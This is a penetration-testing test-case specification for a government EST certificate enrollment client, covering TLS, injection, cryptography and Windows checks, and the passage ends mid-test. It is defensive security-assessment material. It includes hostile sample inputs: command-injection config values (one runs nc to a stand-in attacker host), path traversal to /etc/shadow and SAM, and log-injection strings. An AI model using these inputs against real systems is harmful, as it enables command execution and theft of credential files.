# Penetration Test Cases for EST Client

**Document Version**: 1.0
**Last Updated**: 2026-01-14
**Related Document**: [penetration-testing-requirements.md](penetration-testing-requirements.md)
**Test Engagement**: Annual Penetration Testing

---

## 1. Introduction

This document defines specific test cases for penetration testing the U.S. Government EST (Enrollment over Secure Transport) Client. These test cases provide detailed attack scenarios organized by category to ensure comprehensive security assessment coverage.

### 1.1 Document Purpose

- Provide specific, repeatable test cases for penetration testers
- Ensure consistent testing across annual engagements
- Map test cases to security controls and threat vectors
- Define expected results and success criteria

### 1.2 Test Case Format

Each test case includes:
- **ID**: Unique test case identifier
- **Category**: Testing category (Network, Application, Authentication, etc.)
- **Priority**: P1 (Must Test), P2 (Should Test), P3 (Nice to Test)
- **Description**: What the test validates
- **Prerequisites**: Required setup, access, or tools
- **Steps**: Detailed testing procedure
- **Expected Result**: What should happen if vulnerability exists
- **Pass Criteria**: When the test is considered passed (secure)
- **NIST Control**: Related NIST 800-53 control
- **CWE**: Common Weakness Enumeration reference

### 1.3 Testing Environment

All tests assume the standard test environment defined in [penetration-testing-requirements.md](penetration-testing-requirements.md) Section 5.

---

## 2. Network Security Test Cases

### TC-NET-001: TLS Version Downgrade Attack

**Category**: Network Penetration Testing
**Priority**: P1 (Must Test)
**NIST Control**: SC-8 (Transmission Confidentiality)
**CWE**: CWE-757 (Selection of Less-Secure Algorithm)

**Description**: Verify EST Client refuses connections using weak TLS versions (TLS 1.0, TLS 1.1, SSLv3).

**Prerequisites**:
- EST Client configured to connect to test server
- Network traffic interception capability
- TLS manipulation tools (e.g., `tlspretense`, `tlssled`)

**Steps**:
1. Configure proxy to offer only TLS 1.0 during handshake
2. Initiate EST enrollment from client
3. Observe TLS negotiation
4. Repeat for TLS 1.1, SSLv3, SSLv2

**Expected Result (Vulnerable)**:
- Client accepts TLS 1.0/1.1 connection
- Connection proceeds successfully

**Pass Criteria (Secure)**:
- Client rejects TLS < 1.2 connections
- Connection fails with TLS version error
- Error logged to audit log

---

### TC-NET-002: Weak Cipher Suite Acceptance

**Category**: Network Penetration Testing
**Priority**: P1 (Must Test)
**NIST Control**: SC-13 (Cryptographic Protection)
**CWE**: CWE-327 (Use of Broken Cryptography)

**Description**: Verify EST Client refuses weak cipher suites (RC4, DES, 3DES, export ciphers).

**Prerequisites**:
- EST server configured with weak ciphers enabled
- Network traffic capture

**Steps**:
1. Configure EST server to offer only RC4 ciphers
2. Attempt EST enrollment
3. Observe cipher negotiation in packet capture
4. Repeat for: 3DES, NULL ciphers, export ciphers, anonymous DH

**Expected Result (Vulnerable)**:
- Client accepts weak cipher
- Connection established with RC4/3DES/etc.

**Pass Criteria (Secure)**:
- Client rejects weak ciphers
- Only strong ciphers accepted (AES-GCM, ChaCha20-Poly1305)
- Minimum 128-bit cipher strength enforced

---

### TC-NET-003: Certificate Validation - Expired Certificate

**Category**: Network Penetration Testing
**Priority**: P1 (Must Test)
**NIST Control**: IA-5 (Authenticator Management)
**CWE**: CWE-295 (Improper Certificate Validation)

**Description**: Verify EST Client rejects expired server certificates.

**Prerequisites**:
- EST server with expired certificate
- Client configured to connect to server

**Steps**:
1. Configure EST server with certificate expired 1 day ago
2. Attempt EST enrollment
3. Observe TLS handshake failure
4. Check client error logs

**Expected Result (Vulnerable)**:
- Client accepts expired certificate
- Enrollment proceeds

**Pass Criteria (Secure)**:
- Client rejects expired certificate
- TLS handshake fails with certificate validation error
- Error logged: "Certificate expired" or similar

---

### TC-NET-004: Certificate Validation - Self-Signed Certificate

**Category**: Network Penetration Testing
**Priority**: P1 (Must Test)
**NIST Control**: IA-5 (Authenticator Management)
**CWE**: CWE-295 (Improper Certificate Validation)

**Description**: Verify EST Client rejects self-signed certificates not in trust store.

**Prerequisites**:
- EST server with self-signed certificate
- Certificate NOT in client trust store

**Steps**:
1. Generate self-signed certificate for EST server
2. Configure server with self-signed cert
3. Attempt enrollment from client
4. Verify trust validation failure

**Expected Result (Vulnerable)**:
- Client accepts self-signed certificate
- Enrollment succeeds

**Pass Criteria (Secure)**:
- Client rejects self-signed certificate
- Error: "Certificate not trusted" or "Unknown CA"
- Connection refused

---

### TC-NET-005: Certificate Validation - Hostname Mismatch

**Category**: Network Penetration Testing
**Priority**: P1 (Must Test)
**NIST Control**: IA-5 (Authenticator Management)
**CWE**: CWE-297 (Improper Certificate Validation - Host Mismatch)

**Description**: Verify EST Client rejects certificates with hostname mismatch.

**Prerequisites**:
- EST server certificate for different hostname
- DNS or /etc/hosts entry for test

**Steps**:
1. Configure EST server with cert for `est.example.com`
2. Client configured to connect to `est.test.gov`
3. Attempt enrollment
4. Verify hostname validation error

**Expected Result (Vulnerable)**:
- Client accepts mismatched hostname
- Connection proceeds

**Pass Criteria (Secure)**:
- Client rejects certificate
- Error: "Hostname mismatch" or "Certificate name doesn't match"
- Connection refused

---

### TC-NET-006: Certificate Validation - Revoked Certificate (CRL)

**Category**: Network Penetration Testing
**Priority**: P2 (Should Test)
**NIST Control**: IA-5 (Authenticator Management)
**CWE**: CWE-299 (Improper Check for Certificate Revocation)

**Description**: Verify EST Client checks Certificate Revocation Lists (CRL).

**Prerequisites**:
- EST server with revoked certificate
- CRL accessible from client
- Certificate with CRL distribution point

**Steps**:
1. Issue certificate for EST server
2. Revoke certificate and publish CRL
3. Configure EST server with revoked certificate
4. Attempt enrollment from client
5. Verify CRL is checked

**Expected Result (Vulnerable)**:
- Client ignores CRL
- Accepts revoked certificate

**Pass Criteria (Secure)**:
- Client downloads and checks CRL
- Rejects revoked certificate
- Error logged: "Certificate revoked"

---

### TC-NET-007: Certificate Validation - Revoked Certificate (OCSP)

**Category**: Network Penetration Testing
**Priority**: P2 (Should Test)
**NIST Control**: IA-5 (Authenticator Management)
**CWE**: CWE-299 (Improper Check for Certificate Revocation)

**Description**: Verify EST Client checks OCSP (Online Certificate Status Protocol).

**Prerequisites**:
- EST server certificate with OCSP responder URL
- OCSP responder returning "revoked" status

**Steps**:
1. Configure OCSP responder to return "revoked" for server cert
2. Attempt enrollment from client
3. Monitor OCSP request in network traffic
4. Verify revocation is detected

**Expected Result (Vulnerable)**:
- Client doesn't check OCSP
- Accepts revoked certificate

**Pass Criteria (Secure)**:
- Client queries OCSP responder
- Rejects certificate based on revoked status
- Error logged: "Certificate revoked (OCSP)"

---

### TC-NET-008: Man-in-the-Middle Attack

**Category**: Network Penetration Testing
**Priority**: P1 (Must Test)
**NIST Control**: SC-8 (Transmission Confidentiality)
**CWE**: CWE-300 (Channel Accessible by Non-Endpoint)

**Description**: Verify EST Client detects and prevents MITM attacks.

**Prerequisites**:
- mitmproxy or similar MITM tool
- Network interception capability (ARP spoofing or transparent proxy)

**Steps**:
1. Set up mitmproxy between client and server
2. Configure proxy with self-signed certificate
3. Redirect client traffic through proxy (ARP/DNS)
4. Attempt EST enrollment
5. Verify client detects untrusted certificate

**Expected Result (Vulnerable)**:
- Client accepts proxy's certificate
- Enrollment proceeds through MITM proxy
- Credentials visible to attacker

**Pass Criteria (Secure)**:
- Client rejects proxy certificate
- Connection fails with certificate validation error
- No credentials transmitted to attacker

---

### TC-NET-009: Certificate Pinning Bypass

**Category**: Network Penetration Testing
**Priority**: P2 (Should Test)
**NIST Control**: SC-8 (Transmission Confidentiality)
**CWE**: CWE-295 (Improper Certificate Validation)

**Description**: If certificate pinning is implemented, verify it cannot be bypassed.

**Prerequisites**:
- EST Client with certificate pinning enabled
- Certificate pinning bypass tools (Frida, SSL Kill Switch)

**Steps**:
1. Verify pinning is enabled (check configuration)
2. Attempt to disable pinning via Frida script
3. Attempt MITM attack with pinning bypass
4. Test runtime certificate replacement

**Expected Result (Vulnerable)**:
- Pinning can be bypassed
- MITM attack succeeds

**Pass Criteria (Secure)**:
- Pinning cannot be bypassed via runtime manipulation
- Certificate replacement detected
- Connection refused even with bypass attempts

---

### TC-NET-010: TLS Renegotiation Attack

**Category**: Network Penetration Testing
**Priority**: P2 (Should Test)
**NIST Control**: SC-8 (Transmission Confidentiality)
**CWE**: CWE-310 (Cryptographic Issues)

**Description**: Verify EST Client is not vulnerable to TLS renegotiation attacks.

**Prerequisites**:
- TLS renegotiation testing tools
- Network traffic capture

**Steps**:
1. Establish TLS connection to EST server
2. Initiate TLS renegotiation from client side
3. Attempt to inject data during renegotiation
4. Test secure renegotiation extension (RFC 5746)

**Expected Result (Vulnerable)**:
- Client accepts insecure renegotiation
- Data can be injected

**Pass Criteria (Secure)**:
- Client supports only secure renegotiation (RFC 5746)
- Insecure renegotiation rejected
- No data injection possible

---

## 3. Application Security Test Cases

### TC-APP-001: Configuration File Parsing - Buffer Overflow

**Category**: Application Security Testing
**Priority**: P1 (Must Test)
**NIST Control**: SI-16 (Memory Protection)
**CWE**: CWE-120 (Buffer Copy without Checking Size)

**Description**: Test configuration file parser for buffer overflow vulnerabilities.

**Prerequisites**:
- EST Client source code access
- Ability to modify config.toml
- Debugger (gdb/lldb) or crash monitoring

**Steps**:
1. Create config.toml with extremely long values (10,000+ characters):
   - Long hostname
   - Long username/password
   - Long file paths
2. Launch EST Client with malicious config
3. Monitor for crashes or memory corruption
4. Use fuzzing tools (afl, libfuzzer) for automated testing

**Expected Result (Vulnerable)**:
- Application crashes
- Memory corruption detected
- Potential code execution

**Pass Criteria (Secure)**:
- All long inputs handled gracefully
- No crashes or memory corruption
- Proper error: "Configuration value too long" or similar
- Safe maximum lengths enforced

---

### TC-APP-002: Configuration File Parsing - Injection Attacks

**Category**: Application Security Testing
**Priority**: P1 (Must Test)
**NIST Control**: SI-10 (Information Input Validation)
**CWE**: CWE-78 (OS Command Injection)

**Description**: Test for command injection via configuration values.

**Prerequisites**:
- Configuration file with shell metacharacters
- Process monitoring tools

**Steps**:
1. Insert shell commands in config values:
   ```toml
   est_server = "est.example.com; whoami"
   username = "user`id`"
   cert_path = "$(calc.exe)"
   log_file = "/tmp/log && nc attacker.com 4444"
   ```
2. Launch EST Client
3. Monitor for command execution (process creation)
4. Check logs for unexpected behavior

**Expected Result (Vulnerable)**:
- Shell commands executed
- Unintended processes spawned

**Pass Criteria (Secure)**:
- No command execution
- Special characters properly escaped or rejected
- Error: "Invalid configuration value"

---

### TC-APP-003: Configuration File Parsing - Path Traversal

**Category**: Application Security Testing
**Priority**: P2 (Should Test)
**NIST Control**: SI-10 (Information Input Validation)
**CWE**: CWE-22 (Path Traversal)

**Description**: Test for directory traversal in file path configurations.

**Prerequisites**:
- Configuration with path traversal sequences

**Steps**:
1. Configure paths with traversal:
   ```toml
   cert_path = "../../../etc/passwd"
   key_path = "..\\..\\..\\Windows\\System32\\config\\SAM"
   log_file = "/var/log/../../etc/shadow"
   ```
2. Attempt operations (enrollment, logging)
3. Verify files are not accessed outside intended directories

**Expected Result (Vulnerable)**:
- Files accessed outside application directory
- Sensitive files read or written

**Pass Criteria (Secure)**:
- Path traversal sequences rejected or sanitized
- File access restricted to intended directories
- Error: "Invalid file path" or "Access denied"

---

### TC-APP-004: EST Protocol - Malformed CSR

**Category**: Application Security Testing
**Priority**: P1 (Must Test)
**NIST Control**: SI-10 (Information Input Validation)
**CWE**: CWE-20 (Improper Input Validation)

**Description**: Test handling of malformed Certificate Signing Requests.

**Prerequisites**:
- Ability to craft custom CSRs
- Network traffic modification tools

**Steps**:
1. Generate malformed CSRs:
   - Invalid DER encoding
   - Excessive length (100KB+)
   - Missing required fields
   - Invalid signature
   - Corrupted ASN.1 structure
2. Submit via EST /simpleenroll endpoint
3. Monitor application response

**Expected Result (Vulnerable)**:
- Application crashes
- Memory corruption
- Unexpected behavior

**Pass Criteria (Secure)**:
- All malformed CSRs rejected gracefully
- Proper error responses (HTTP 400)
- No crashes or resource exhaustion
- Errors logged for invalid CSR

---

### TC-APP-005: EST Protocol - Oversized Certificate

**Category**: Application Security Testing
**Priority**: P2 (Should Test)
**NIST Control**: SC-5 (Denial of Service Protection)
**CWE**: CWE-400 (Uncontrolled Resource Consumption)

**Description**: Test handling of extremely large certificates.

**Prerequisites**:
- EST server under control
- Ability to generate large certificates

**Steps**:
1. Configure EST server to return large certificate (10MB+)
2. Initiate enrollment from client
3. Monitor memory usage and performance
4. Verify resource limits enforced

**Expected Result (Vulnerable)**:
- Client accepts unlimited certificate size
- Memory exhaustion
- Denial of service

**Pass Criteria (Secure)**:
- Maximum certificate size enforced (e.g., 100KB)
- Oversized certificates rejected
- Error: "Certificate too large"
- No memory exhaustion

---

### TC-APP-006: Input Validation - Username/Password Length

**Category**: Application Security Testing
**Priority**: P2 (Should Test)
**NIST Control**: SI-10 (Information Input Validation)
**CWE**: CWE-129 (Improper Validation of Array Index)

**Description**: Test authentication with extremely long credentials.

**Prerequisites**:
- EST Client with Basic authentication
- Test credentials

**Steps**:
1. Configure credentials with extreme lengths:
   - Username: 10,000 characters
   - Password: 10,000 characters
2. Attempt authentication
3. Monitor for crashes or memory issues

**Expected Result (Vulnerable)**:
- Buffer overflow
- Application crash

**Pass Criteria (Secure)**:
- Length limits enforced (e.g., 256 characters)
- No crashes
- Error: "Username/password too long"

---

### TC-APP-007: Integer Overflow - Certificate Validity Period

**Category**: Application Security Testing
**Priority**: P3 (Nice to Test)
**NIST Control**: SI-16 (Memory Protection)
**CWE**: CWE-190 (Integer Overflow)

**Description**: Test handling of certificates with extreme validity periods.

**Prerequisites**:
- Certificate with validity period near integer limits
- Source code review for time calculations

**Steps**:
1. Generate certificate with:
   - `notBefore`: Jan 1, 1970
   - `notAfter`: Dec 31, 9999 (or max date)
2. Attempt to validate certificate
3. Check for integer overflow in time calculations
4. Test with negative time values

**Expected Result (Vulnerable)**:
- Integer overflow in time calculations
- Incorrect validation results

**Pass Criteria (Secure)**:
- Time calculations use appropriate data types
- Extreme dates handled correctly
- Validation logic correct for edge cases

---

### TC-APP-008: Memory Disclosure - Error Messages

**Category**: Application Security Testing
**Priority**: P2 (Should Test)
**NIST Control**: SI-11 (Error Handling)
**CWE**: CWE-209 (Information Exposure Through Error Message)

**Description**: Verify error messages don't leak sensitive information.

**Prerequisites**:
- Various error conditions
- Error message monitoring

**Steps**:
1. Trigger errors:
   - Invalid credentials
   - Network errors
   - File access errors
   - Cryptographic errors
2. Examine error messages for:
   - File paths
   - Internal IPs
   - Usernames
   - Stack traces
   - Memory addresses

**Expected Result (Vulnerable)**:
- Error messages contain sensitive details
- Stack traces exposed to users
- Internal paths revealed

**Pass Criteria (Secure)**:
- Generic error messages to users
- Detailed errors only in logs (access-controlled)
- No sensitive information in user-facing errors
- Stack traces not exposed

---

## 4. Authentication and Authorization Test Cases

### TC-AUTH-001: Basic Authentication - Weak Credentials

**Category**: Authentication Testing
**Priority**: P1 (Must Test)
**NIST Control**: IA-5 (Authenticator Management)
**CWE**: CWE-521 (Weak Password Requirements)

**Description**: Test if client accepts weak passwords.

**Prerequisites**:
- EST Client with Basic authentication
- Test EST server

**Steps**:
1. Configure client with weak passwords:
   - Empty password
   - Single character: "a"
   - Common password: "password"
   - Sequential: "12345678"
2. Attempt authentication
3. Verify password strength validation (if applicable)

**Expected Result (Vulnerable)**:
- Client accepts any password
- No strength validation

**Pass Criteria (Secure)**:
- If client enforces password policy, weak passwords rejected
- If client doesn't enforce (server-side validation), passwords transmitted securely
- Note: Password policy typically enforced server-side

---

### TC-AUTH-002: Certificate Authentication - Expired Client Certificate

**Category**: Authentication Testing
**Priority**: P1 (Must Test)
**NIST Control**: IA-5 (Authenticator Management)
**CWE**: CWE-295 (Improper Certificate Validation)

**Description**: Verify client uses only valid certificates for authentication.

**Prerequisites**:
- EST Client with certificate authentication
- Expired client certificate

**Steps**:
1. Configure client with expired certificate
2. Attempt EST enrollment
3. Verify client validates certificate before use
4. Check error handling

**Expected Result (Vulnerable)**:
- Client uses expired certificate
- Authentication proceeds

**Pass Criteria (Secure)**:
- Client validates certificate validity before use
- Refuses to use expired certificate
- Error: "Client certificate expired"

---

### TC-AUTH-003: Authentication Bypass - Null Authentication

**Category**: Authentication Testing
**Priority**: P1 (Must Test)
**NIST Control**: IA-2 (Identification and Authentication)
**CWE**: CWE-287 (Improper Authentication)

**Description**: Test if authentication can be bypassed with null credentials.

**Prerequisites**:
- EST Client configured for authentication
- Network traffic modification

**Steps**:
1. Remove Authorization header from EST request
2. Send NULL/empty credentials
3. Send malformed Authorization header
4. Attempt unauthenticated enrollment

**Expected Result (Vulnerable)**:
- Unauthenticated requests accepted
- Enrollment succeeds without credentials

**Pass Criteria (Secure)**:
- All requests require authentication
- Null credentials rejected (HTTP 401)
- Error: "Authentication required"

---

### TC-AUTH-004: Session Hijacking - Replay Attack

**Category**: Authentication Testing
**Priority**: P2 (Should Test)
**NIST Control**: SC-23 (Session Authenticity)
**CWE**: CWE-294 (Authentication Bypass via Capture-Replay)

**Description**: Test if authentication tokens can be replayed.

**Prerequisites**:
- Captured authentication tokens
- Network traffic replay tools

**Steps**:
1. Capture valid EST request with authentication
2. Replay request multiple times
3. Test replay after session should expire
4. Verify replay protection mechanisms

**Expected Result (Vulnerable)**:
- Replayed requests accepted
- No nonce or timestamp validation

**Pass Criteria (Secure)**:
- EST protocol inherent replay protection (if applicable)
- Replay detection mechanisms active
- Replayed requests rejected

**Note**: EST typically uses TLS client certs or short-lived tokens, limiting replay risk.

---

### TC-AUTH-005: Credential Storage - Plaintext Credentials

**Category**: Authentication Testing
**Priority**: P1 (Must Test)
**NIST Control**: IA-5(1) (Password-Based Authentication)
**CWE**: CWE-256 (Plaintext Storage of Password)

**Description**: Verify credentials are not stored in plaintext.

**Prerequisites**:
- EST Client configured with credentials
- File system access
- Memory analysis tools

**Steps**:
1. Configure client with test credentials
2. Search for plaintext credentials in:
   - Configuration files
   - Log files
   - Registry (Windows)
   - Environment variables
   - Memory dumps
3. Use string search tools (grep, strings)

**Expected Result (Vulnerable)**:
- Credentials stored in plaintext
- Passwords visible in config files or memory

**Pass Criteria (Secure)**:
- Credentials encrypted at rest (DPAPI on Windows)
- No plaintext credentials in files or logs
- Credentials cleared from memory after use (zeroization)

---

## 5. Cryptography Test Cases

### TC-CRYPTO-001: Key Generation - Weak Key Size

**Category**: Cryptography Testing
**Priority**: P1 (Must Test)
**NIST Control**: SC-13 (Cryptographic Protection)
**CWE**: CWE-326 (Inadequate Encryption Strength)

**Description**: Verify client generates keys of sufficient length.

**Prerequisites**:
- EST Client key generation capability
- Key inspection tools (openssl, certutil)

**Steps**:
1. Configure client to generate RSA key
2. Generate key pair
3. Inspect key length
4. Verify minimum key size (RSA 2048-bit, ECDSA P-256)
5. Test if client can be forced to generate smaller keys

**Expected Result (Vulnerable)**:
- Client generates weak keys (RSA 1024-bit or less)
- No minimum key size enforcement

**Pass Criteria (Secure)**:
- RSA: Minimum 2048-bit (3072 or 4096 preferred)
- ECDSA: Minimum P-256
- Weak key sizes rejected
- Error if configuration requests weak keys

---

### TC-CRYPTO-002: Random Number Generation - Weak RNG

**Category**: Cryptography Testing
**Priority**: P1 (Must Test)
**NIST Control**: SC-13 (Cryptographic Protection)
**CWE**: CWE-338 (Weak Pseudo-Random Number Generator)

**Description**: Verify cryptographically secure random number generation.

**Prerequisites**:
- Multiple key generations
- Statistical analysis tools (ent, dieharder)
- Source code review

**Steps**:
1. Generate 100 key pairs
2. Extract random components (nonces, IVs, keys)
3. Perform statistical analysis for randomness
4. Review source code for RNG usage:
   - Cryptographically secure RNG (CNG on Windows, /dev/urandom on Unix)
   - No weak RNGs (rand(), Mersenne Twister)
5. Check for predictable seeds

**Expected Result (Vulnerable)**:
- Weak RNG used (rand(), predictable seed)
- Statistical bias in random values

**Pass Criteria (Secure)**:
- CSPRNG used (CNG BCryptGenRandom, /dev/urandom, rust crypto RNG)
- Random values pass statistical tests
- No predictable patterns

---

### TC-CRYPTO-003: Key Storage - Unprotected Private Keys

**Category**: Cryptography Testing
**Priority**: P1 (Must Test)
**NIST Control**: SC-12 (Cryptographic Key Management)
**CWE**: CWE-320 (Key Management Errors)

**Description**: Verify private keys are protected at rest.

**Prerequisites**:
- EST Client with generated key pair
- File system access

**Steps**:
1. Generate key pair using EST Client
2. Locate private key storage:
   - Windows: CNG key container
   - Unix: File system
3. Check protection:
   - Windows: DPAPI encryption, ACLs
   - Unix: File permissions (0600), encryption
4. Attempt to read key as different user

**Expected Result (Vulnerable)**:
- Private key stored in plaintext
- Weak file permissions (world-readable)
- No encryption

**Pass Criteria (Secure)**:
- Windows: Key in CNG container, DPAPI protected, SYSTEM/user-only access
- Unix: File permissions 0600 (owner-only), DPAPI/TPM protection if available
- Key encrypted at rest

---

### TC-CRYPTO-004: Key Storage - TPM Bypass

**Category**: Cryptography Testing
**Priority**: P2 (Should Test) - Windows only
**NIST Control**: SC-12 (Cryptographic Key Management)
**CWE**: CWE-320 (Key Management Errors)

**Description**: If TPM protection is used, verify keys cannot be extracted.

**Prerequisites**:
- Windows system with TPM 2.0
- EST Client configured with TPM key protection
- Administrator access

**Steps**:
1. Generate key with TPM protection
2. Attempt to export key:
   - Via CNG APIs
   - Via registry dumps
   - Via memory dumps
3. Attempt to use key from different process
4. Test anti-hammering (PIN attempts)

**Expected Result (Vulnerable)**:
- Key exported from TPM
- Key used without TPM authorization

**Pass Criteria (Secure)**:
- Key bound to TPM, cannot be exported
- Key use requires TPM authorization
- Failed export attempts logged

---

### TC-CRYPTO-005: Timing Attack - HMAC Comparison

**Category**: Cryptography Testing
**Priority**: P3 (Nice to Test)
**NIST Control**: SC-13 (Cryptographic Protection)
**CWE**: CWE-208 (Observable Timing Discrepancy)

**Description**: Test for timing side-channels in cryptographic operations.

**Prerequisites**:
- Code review of HMAC/signature verification
- High-precision timing tools
- Statistical analysis

**Steps**:
1. Review code for constant-time comparisons
2. Send HMACs with:
   - Correct values
   - Incorrect first byte
   - Incorrect middle byte
   - Incorrect last byte
3. Measure response times (1000+ samples each)
4. Perform statistical analysis for timing differences

**Expected Result (Vulnerable)**:
- Timing varies based on error location
- Early rejection of incorrect bytes
- Non-constant-time comparison

**Pass Criteria (Secure)**:
- Constant-time comparison used
- No measurable timing difference
- Timing-safe comparison functions used (e.g., `subtle::ConstantTimeEq`)

---

### TC-CRYPTO-006: Algorithm Downgrade - MD5/SHA1 Signatures

**Category**: Cryptography Testing
**Priority**: P1 (Must Test)
**NIST Control**: SC-13 (Cryptographic Protection)
**CWE**: CWE-327 (Broken Cryptography)

**Description**: Verify client refuses weak signature algorithms.

**Prerequisites**:
- EST server configured with weak signatures
- Certificate generation tools

**Steps**:
1. Generate server certificate with MD5 signature
2. Attempt EST enrollment
3. Verify client rejects MD5
4. Repeat for SHA-1 signatures
5. Test if client can be forced to accept weak signatures

**Expected Result (Vulnerable)**:
- Client accepts MD5/SHA-1 signatures
- No algorithm validation

**Pass Criteria (Secure)**:
- MD5 signatures rejected
- SHA-1 signatures rejected (or warning logged)
- Minimum SHA-256 required
- Error: "Weak signature algorithm"

---

### TC-CRYPTO-007: Memory Handling - Key Material in Memory

**Category**: Cryptography Testing
**Priority**: P2 (Should Test)
**NIST Control**: SC-12 (Cryptographic Key Management)
**CWE**: CWE-316 (Cleartext Storage of Sensitive Info in Memory)

**Description**: Verify private keys are zeroized from memory after use.

**Prerequisites**:
- Memory analysis tools (Process Explorer, gdb, volatility)
- EST Client performing cryptographic operations
- Debugger or memory dump capability

**Steps**:
1. Start EST Client with debugging enabled
2. Perform enrollment (loads private key)
3. After operation completes, dump process memory
4. Search memory dump for private key material using:
   - Known key patterns (PKCS#8 headers)
   - Distinctive byte sequences from key
5. Verify zeroization after use

**Expected Result (Vulnerable)**:
- Private key visible in memory after use
- No zeroization

**Pass Criteria (Secure)**:
- Private key zeroized after use
- Memory contains only encrypted/protected keys
- Sensitive data cleared from stack and heap
- Zeroization functions used (e.g., `zeroize` crate)

---

## 6. Windows Platform Test Cases

### TC-WIN-001: Privilege Escalation - Service Account

**Category**: Windows Platform Testing
**Priority**: P1 (Must Test) - Windows only
**NIST Control**: AC-6 (Least Privilege)
**CWE**: CWE-269 (Improper Privilege Management)

**Description**: Verify EST Auto-Enrollment Service runs with minimum privileges.

**Prerequisites**:
- Windows system with EST service installed
- Administrator access for inspection

**Steps**:
1. Inspect service configuration:
   ```powershell
   Get-Service "EST Auto-Enrollment" | Select-Object *
   sc.exe qc "EST Auto-Enrollment"
   ```
2. Verify service account (should not be SYSTEM unless necessary)
3. Check service privileges using Process Explorer
4. Attempt privilege escalation from service context

**Expected Result (Vulnerable)**:
- Service runs as SYSTEM unnecessarily
- Excessive privileges granted

**Pass Criteria (Secure)**:
- Service runs as least-privileged account
- Minimum required privileges only
- No unnecessary access tokens
- Principle of least privilege enforced

---

### TC-WIN-002: DLL Hijacking - Service Executable

**Category**: Windows Platform Testing
**Priority**: P1 (Must Test) - Windows only
**NIST Control**: SI-7 (Software Integrity)
**CWE**: CWE-426 (Untrusted Search Path)

**Description**: Test for DLL hijacking vulnerabilities in service.

**Prerequisites**:
- Windows system with EST Client installed
- DLL monitoring tools (Process Monitor)
- Test DLL (logging DLL load)

**Steps**:
1. Monitor DLL load attempts using Process Monitor
2. Identify DLLs loaded from unsafe locations
3. Place malicious DLL in application directory
4. Restart service and verify DLL is not loaded
5. Test common hijacking locations:
   - Current directory
   - Application directory (if not locked down)
   - PATH environment variable directories

**Expected Result (Vulnerable)**:
- Service loads DLLs from unsafe locations
- DLL hijacking possible

**Pass Criteria (Secure)**:
- DLLs loaded only from System32 or application directory
- Application directory has proper ACLs (admin-write only)
- Safe DLL search mode enabled
- No DLL loading from current working directory

---

### TC-WIN-003: Registry Manipulation - Service Configuration

**Category**: Windows Platform Testing
**Priority**: P2 (Should Test) - Windows only
**NIST Control**: CM-5 (Access Restrictions for Change)
**CWE**: CWE-732 (Incorrect Permission Assignment)

**Description**: Verify registry keys are protected from tampering.

**Prerequisites**:
- Windows system with EST Client installed
- Standard user account (non-admin)

**Steps**:
1. Identify registry keys used by EST Client:
   ```
   HKLM\SYSTEM\CurrentControlSet\Services\ESTAutoEnrollment
   HKLM\SOFTWARE\EST-Client
   ```
2. Attempt to modify keys as standard user:
   - Service ImagePath
   - Service start type
   - Configuration parameters
3. Check ACLs on registry keys

**Expected Result (Vulnerable)**:
- Standard user can modify service configuration
- Weak ACLs on registry keys

**Pass Criteria (Secure)**:
- Registry keys writable by Administrators only
- Proper ACLs: SYSTEM (Full), Administrators (Full), Users (Read)
- Standard user cannot modify service configuration
- Changes logged to Security event log

---

### TC-WIN-004: DPAPI Key Extraction

**Category**: Windows Platform Testing
**Priority**: P2 (Should Test) - Windows only
**NIST Control**: SC-12 (Cryptographic Key Management)
**CWE**: CWE-320 (Key Management Errors)

**Description**: Attempt to extract DPAPI-protected keys.

**Prerequisites**:
- EST Client using DPAPI for key protection
- DPAPI extraction tools (mimikatz, DPAPImk2john)
- Administrator access

**Steps**:
1. Locate DPAPI-protected keys (AppData or ProgramData)
2. Attempt extraction as different user
3. Attempt extraction with admin privileges
4. Attempt offline extraction (if system backup available)
5. Test protection against memory dumps

**Expected Result (Vulnerable)**:
- Keys extracted by different user
- Admin can extract keys for other users

**Pass Criteria (Secure)**:
- Keys accessible only by user who protected them
- Admin cannot decrypt user-protected keys (user-scope DPAPI)
- Keys protected by user's login credentials
- Offline extraction requires user password

**Note**: If using machine-scope DPAPI, admin access allows decryption - this is expected.

---

### TC-WIN-005: CNG Container Access Control

**Category**: Windows Platform Testing
**Priority**: P1 (Must Test) - Windows only
**NIST Control**: SC-12 (Cryptographic Key Management)
**CWE**: CWE-732 (Incorrect Permission Assignment)

**Description**: Verify CNG key containers have proper ACLs.

**Prerequisites**:
- Windows system with CNG key containers
- Multiple user accounts

**Steps**:
1. Generate key pair in CNG container
2. Locate container in filesystem:
   ```
   C:\ProgramData\Microsoft\Crypto\SystemKeys
   C:\Users\<user>\AppData\Roaming\Microsoft\Crypto\Keys
   ```
3. Check file ACLs:
   ```powershell
   Get-Acl "C:\ProgramData\Microsoft\Crypto\SystemKeys\<key-file>"
   ```
4. Attempt access as different user
5. Verify permissions: SYSTEM + user/service account only

**Expected Result (Vulnerable)**:
- Weak ACLs allow unauthorized access
- Other users can read key material

**Pass Criteria (Secure)**:
- ACLs restrict access to SYSTEM + key owner only
- Other users cannot read key files
- Proper inheritance and propagation
- No world-readable permissions

---

### TC-WIN-006: Event Log Injection

**Category**: Windows Platform Testing
**Priority**: P3 (Nice to Test) - Windows only
**NIST Control**: AU-9 (Protection of Audit Information)
**CWE**: CWE-117 (Improper Output Neutralization for Logs)

**Description**: Test for log injection in Windows Event Log.

**Prerequisites**:
- EST Client logging to Windows Event Log
- Ability to provide malicious input

**Steps**:
1. Provide input with newlines and special characters:
   ```
   username = "admin\r\nEventType: Success\r\nUser: attacker"
   ```
2. Trigger logging of malicious input
3. Review Event Log entries for injection
4. Verify input sanitization

**Expected Result (Vulnerable)**:
- Log injection succeeds
- False events created
- Event log parsing confused

**Pass Criteria (Secure)**:
- Input sanitized before logging
- Newlines and special characters escaped
- No log injection possible
- Malicious input logged as-is (but escaped)

---

## 7. Business Logic Test Cases

### TC-LOGIC-001: Certificate Renewal - Enrollment with Existing Certificate

**Category**: Business Logic Testing
**Priority**: P1 (Must Test)
**NIST Control**: IA-5 (Authenticator Management)
**CWE**: CWE-840 (Business Logic Errors)

**Description**: Test if client can renew certificate before expiration.

**Prerequisites**:
- EST Client with existing valid certificate
- EST server configured for renewal

**Steps**:
1. Enroll to get initial certificate (valid for 365 days)
2. Immediately attempt reenrollment
3. Verify renewal logic checks:
   - Certificate not expired
   - Certificate within renewal window (e.g., 30 days before expiry)
4. Test renewal at different times:
   - Immediately after enrollment (should fail)
   - 1 month before expiry (should succeed)
   - After expiry (should fail - require reenrollment)

**Expected Result (Varies)**:
- Renewal allowed regardless of time
- No renewal window enforcement

**Pass Criteria (Depends on Policy)**:
